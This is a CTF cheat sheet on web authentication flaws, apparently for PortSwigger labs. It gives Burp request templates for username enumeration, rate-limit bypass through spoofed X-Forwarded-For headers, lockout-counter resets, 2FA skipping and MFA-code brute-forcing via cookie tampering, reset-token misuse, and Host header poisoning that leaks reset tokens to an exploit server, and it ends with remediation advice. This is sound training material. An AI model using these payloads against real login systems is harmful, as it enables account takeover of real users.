# Authentication Vulnerabilities — CTF Cheat Sheet

**Tools:** Burp Suite Community / Professional, Burp Intruder, Macro Engine  
**Practice:** PortSwigger Web Security Academy  
**Scope:** Authorized CTFs and lab environments only

---

## 1. CTF Methodology

1. **Map Authentication Flows:** Document login, registration, password reset, account recovery, and multi-factor authentication (MFA/2FA) paths.
2. **Username Enumeration:** Detect differences in server responses for valid vs invalid usernames:
   - Error messages (`"Invalid user"` vs `"Incorrect password"`)
   - Status codes / Response lengths
   - Response times (due to expensive password hashing like bcrypt on valid users)
3. **Password Brute-Forcing & Rate-Limit Bypasses:**
   - Test IP rotation headers (`X-Forwarded-For: 127.0.0.X`).
   - Alternate login attempts (UserA → Admin → UserA) to bypass consecutive failure locks.
4. **2FA / MFA Bypasses:**
   - Direct endpoint navigation (skipping Step 2).
   - Session/cookie manipulation (`verify=victim` cookie).
   - Brute-forcing 4-digit MFA codes.
5. **Password Reset Flaws:**
   - Parameter tampering (`temp-forgot-password-token`, `username=victim`).
   - Host header poisoning leading to token leakage.

---

## 2. Username Enumeration Techniques

### 1. Different Error Messages / Typos
- Send candidate usernames via **Intruder (Sniper)**.
- Observe subtle variations:
  - `"Invalid username"` (User does not exist)
  - `"Incorrect password"` (User exists!)
  - Subtly missing punctuation (e.g. `"Invalid username"` vs `"Incorrect password."`).

---

### 2. Response Timing Oracles
Password hashing algorithms (`bcrypt`, `Argon2`) take significant computation time. If the backend only runs the hash check when the user exists, valid usernames take measurably longer:
- Invalid user: ~20ms response time
- Valid user: ~350ms response time

---

## 3. Brute-Force & Rate-Limit Bypasses

### 1. Spoofing IP Headers via Intruder
If rate-limiting tracks client IP, add an IP spoofing header with an incrementing payload:
```http
POST /login HTTP/2
Host: TARGET.net
X-Forwarded-For: 127.0.0.§1§
Content-Type: application/x-www-form-urlencoded

username=administrator&password=§password§
```

---

### 2. Alternating Brute-Force (Counter Reset Flaw)
If the account locks after 3 failed attempts, but resets on a single successful attempt:
1. Attempt 1: `victim : password1` (Fail)
2. Attempt 2: `victim : password2` (Fail)
3. Attempt 3: `attacker : valid_pass` (Success resets lockout counter!)
4. Repeat via **Intruder (Pitchfork)** using a custom wordlist alternating attacker credentials every 3 attempts.

---

### 3. Multiple Credentials in Single Request
Some JSON APIs accept arrays of passwords or multiple authentication objects:
```json
POST /api/login HTTP/2
Content-Type: application/json

{
    "username": "admin",
    "password": ["pass1", "pass2", "pass3", "admin123"]
}
```

---

## 4. 2FA / MFA Bypasses

### 1. Direct Page Access (Missing Enforced State)
1. Complete Step 1 (valid credentials).
2. When redirected to `/login2` (prompting for 2FA code), immediately navigate directly to:
   ```http
   GET /my-account HTTP/2
   ```
   If the session cookie was issued in Step 1, 2FA is completely bypassed.

---

### 2. Cookie Manipulation in 2FA Verification
The application uses a temporary cookie to track *who* is being verified in Step 2:

```http
POST /login2 HTTP/2
Cookie: verify=carlos; session=ATTACKER_SESSION
Content-Type: application/x-www-form-urlencoded

mfa-code=1234
```
- **Exploitation:** Change `verify=wiener` to `verify=carlos`.
- Use **Burp Intruder** to brute-force the 4-digit `mfa-code` (`0000` to `9999`). When the valid code is submitted, Carlos's session is granted.

---

## 5. Password Reset Flaws

### 1. Broken Token Association
The password reset submission takes the token and username as separate parameters:
```http
POST /forgot-password?temp-forgot-password-token=ATTACKER_VALID_TOKEN HTTP/2
Content-Type: application/x-www-form-urlencoded

username=carlos&new-password-1=Password123!&new-password-2=Password123!
```
The server checks that `temp-forgot-password-token` is valid, but fails to check whether it belongs to `carlos`.

---

### 2. Password Reset Poisoning via Host Header
When the application constructs password reset links using the client's `Host` header:
```http
POST /forgot-password HTTP/2
Host: EXPLOIT-SERVER-SUBDOMAIN
Content-Type: application/x-www-form-urlencoded

username=carlos
```
The victim receives an email with: `https://EXPLOIT-SERVER-SUBDOMAIN/forgot-password?token=XYZ`.
When the victim clicks the link, the token is logged in your Exploit Server access logs.

---

## 6. CTF Quick Reference

| Vulnerability | Attack Technique | Burp Configuration |
|---|---|---|
| **User Enumeration** | Error message diff | Intruder: Grep - Match / Response length |
| **Timing Attack** | Response delay on valid user | Intruder: Column "Response completed" |
| **Rate Limit Lockout** | Header spoofing | Add `X-Forwarded-For: 192.168.1.§X§` |
| **2FA Skipping** | Step 2 not enforced | Direct GET to `/my-account` |
| **2FA Verification** | Cookie tracks victim | Change `verify=victim`, brute-force code `0000..9999` |
| **Reset Poisoning** | Host header in email link | Change `Host: exploit-server.net` |

---

## 7. Remediation

- **Unified Error Responses:** Return generic messages: `"Invalid username or password"`.
- **Constant-Time Comparison:** Mitigate timing attacks by ensuring failed user lookups take comparable execution time to password hashing.
- **Strict Multi-Factor State Machine:** Tie session advancement strictly to verified 2FA completion on the server session store.
- **Secure Password Reset Tokens:** Generate cryptographically random, single-use tokens tied exclusively to the requesting account with short expiry.
